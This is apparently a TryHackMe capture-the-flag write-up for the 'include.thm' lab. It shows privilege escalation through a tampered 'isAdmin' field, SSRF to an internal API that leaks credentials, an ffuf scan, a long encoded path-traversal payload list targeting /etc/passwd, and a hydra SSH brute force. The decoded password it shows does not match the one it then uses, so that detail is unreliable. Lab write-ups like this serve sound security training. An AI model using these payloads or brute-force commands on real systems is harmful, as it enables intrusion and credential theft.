# ENUMERATION
---



## OPEN PORTS
---

| PORT | SERVICE |
| --------- | ------- |
| 22/tcp | ssh |
| 25/tcp | smtp |
| 110/tcp | pop3 |
| 143/tcp | imap |
| 993/tcp | imaps |
| 995/tcp | pop3s |
| 4000/tcp | http |
| 50000/tcp | http |


# RECONNAISSANCE
---

Let's go into both websites:

![Pasted image 20250502222332.png](../../IMAGES/Pasted%20image%2020250502222332.png)


![Pasted image 20250502222339.png](../../IMAGES/Pasted%20image%2020250502222339.png)

Let's go with the one located at port `4000` first, we can login using:

```
guest:guest
```


![Pasted image 20250502222618.png](../../IMAGES/Pasted%20image%2020250502222618.png)


If we go to any profile, we can see this:


![Pasted image 20250502222747.png](../../IMAGES/Pasted%20image%2020250502222747.png)

We can `Recommend Activities`, let's send a test request and check how it behaves:

![Pasted image 20250502222938.png](../../IMAGES/Pasted%20image%2020250502222938.png)


We get a redirection, `XSS` and `SQLI` does not work on here, it only reflects in this way:

![Pasted image 20250502223244.png](../../IMAGES/Pasted%20image%2020250502223244.png)

But, there's no execution or anything like that, the interesting stuff in here is the `isAdmin` section, if we can modify that to true, we may be able to become admin user on here, we need to send a request with the following stuff:


![Pasted image 20250502223530.png](../../IMAGES/Pasted%20image%2020250502223530.png)


We can now see this:

![Pasted image 20250502223604.png](../../IMAGES/Pasted%20image%2020250502223604.png)

Let's go with the exploitation phase.


# EXPLOITATION
---

We became admin and two functionalities were added to the panel:


![Pasted image 20250502223632.png](../../IMAGES/Pasted%20image%2020250502223632.png)

We got `API` and `Settings`, let's check them both:

![Pasted image 20250502223732.png](../../IMAGES/Pasted%20image%2020250502223732.png)

![Pasted image 20250502223740.png](../../IMAGES/Pasted%20image%2020250502223740.png)

Both are useful, we got some info from the API and an update banner image url functionality, I tried uploading a shell from a python server to get RCE but it didn't worked, that's when i realized i can maybe get the hidden contents from the `http://127.0.0.1:5000/getAllAdmins101099991` API service:


![Pasted image 20250502224237.png](../../IMAGES/Pasted%20image%2020250502224237.png)

![Pasted image 20250502224245.png](../../IMAGES/Pasted%20image%2020250502224245.png)

We get an encoded base64 response, let's decode it:

![Pasted image 20250502224337.png](../../IMAGES/Pasted%20image%2020250502224337.png)

As seen, we get this:

```json
{"ReviewAppUsername":"admin","ReviewAppPassword":"admin@!!!","SysMonAppUsername":"administrator","SysMonAppPassword":"c"}
```

These seem to be the credentials for the web application located at port `50000`, let's try them:

```
administrator:S$9$qk6d#**LQU
```


![Pasted image 20250502224615.png](../../IMAGES/Pasted%20image%2020250502224615.png)


We got first flag:

```
THM{!50_55Rf_1S_d_k3Y??!}
```

If we fuzz this page, we can find this:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://include.thm:50000/FUZZ" -ic -c -t 200 -e .php

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : GET
 :: URL : http://include.thm:50000/FUZZ
 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions : .php
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 200
 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

uploads [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 177ms]
templates [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 5177ms]
index.php [Status: 200, Size: 1611, Words: 256, Lines: 32, Duration: 6196ms]
.php [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 6205ms]
profile.php [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 7248ms]
login.php [Status: 200, Size: 2044, Words: 338, Lines: 48, Duration: 7249ms]
api.php [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 178ms]
javascript [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 177ms]
logout.php [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 180ms]
auth.php [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 183ms]
dashboard.php [Status: 302, Size: 1225, Words: 201, Lines: 28, Duration: 176ms]
phpmyadmin [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 179ms]
```


We got `profile.php`:

![Pasted image 20250502225430.png](../../IMAGES/Pasted%20image%2020250502225430.png)

Seems like we need a parameter, if we check source code of the dashboard, we can see the following:

![Pasted image 20250502225353.png](../../IMAGES/Pasted%20image%2020250502225353.png)


We can now see the way it must be formatted, let's submit the request to our proxy to check it better:

![Pasted image 20250502225636.png](../../IMAGES/Pasted%20image%2020250502225636.png)

The structure of the URL may be vulnerable to LFI, let's send this to `Automate` and send some `LFI payloads`, I used the following wordlist:

```txt
%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252fetc%252fpasswd
%252e%252e%252f%252e%252e%252fetc%252fpasswd
%2E%2E/%2E%2E/etc/passwd
..%255c..%255cetc%255cpasswd
%2e%2e%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252f..%252fetc%252fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e%2f..%2f..%2fetc%2fpasswd
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
..%255c..%255c..%255cetc%255cpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%255c..%255c..%255c..%255cetc%255cpasswd
%2e%2e%2f..%2f..%2f..%2fetc%2fpasswd
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%255c..%255c..%255c..%255c..%255cetc%255cpasswd
%2e%2e%2f..%2f..%2f..%2f..%2fetc%2fpasswd
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%255c..%255c..%255c..%255c..%255c..%255cetc%255cpasswd
%2e%2e%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%255c..%255c..%255c..%255c..%255c..%255c..%255cetc%255cpasswd
%2e%2e%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255cetc%255cpasswd
%2e%2e%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc%2fpasswd
..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255cetc%255cpasswd
%2e%2e%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f


```



![Pasted image 20250502231125.png](../../IMAGES/Pasted%20image%2020250502231125.png)

![Pasted image 20250502232057.png](../../IMAGES/Pasted%20image%2020250502232057.png)

We got an user named `joshua`, let's bruteforce our way in:


```
hydra -l joshua -P /usr/share/wordlists/rockyou.txt include.thm ssh
[22][ssh] host: include.thm login: joshua password: 123456
```

We can now go in ssh:

![Pasted image 20250502232411.png](../../IMAGES/Pasted%20image%2020250502232411.png)


We can now go into `/var/www/html` and get the flag:

```
joshua@filepath:/var/www/html$ ls -la
total 52
drwxr-xr-x 4 ubuntu ubuntu 4096 Mar 12 2024 .
drwxr-xr-x 3 root root 4096 Nov 10 2021 ..
-rw-rw-r-- 1 ubuntu ubuntu 351 Feb 21 2024 .htaccess
-rw-rw-r-- 1 ubuntu ubuntu 38 Feb 22 2024 505eb0fb8a9f32853b4d955e1f9123ea.txt
-rw-rw-r-- 1 ubuntu ubuntu 257 Feb 23 2023 api.php
-rw-rw-r-- 1 ubuntu ubuntu 932 Feb 26 2024 auth.php
-rw-rw-r-- 1 ubuntu ubuntu 3504 Feb 21 2024 dashboard.php
-rw-rw-r-- 1 ubuntu ubuntu 429 Feb 21 2024 index.php
-rw-rw-r-- 1 ubuntu ubuntu 1000 Feb 20 2024 login.php
-rw-rw-r-- 1 ubuntu ubuntu 81 Nov 5 2023 logout.php
-rw-rw-r-- 1 ubuntu ubuntu 444 Mar 12 2024 profile.php
drwxrwxr-x 2 ubuntu ubuntu 4096 Mar 12 2024 templates
drwxrwxr-x 2 ubuntu ubuntu 4096 Feb 20 2024 uploads
```

```
joshua@filepath:/var/www/html$ cat 505eb0fb8a9f32853b4d955e1f9123ea.txt
THM{505eb0fb8a9f32853b4d955e1f9123ea}
```




![Pasted image 20250502232613.png](../../IMAGES/Pasted%20image%2020250502232613.png)






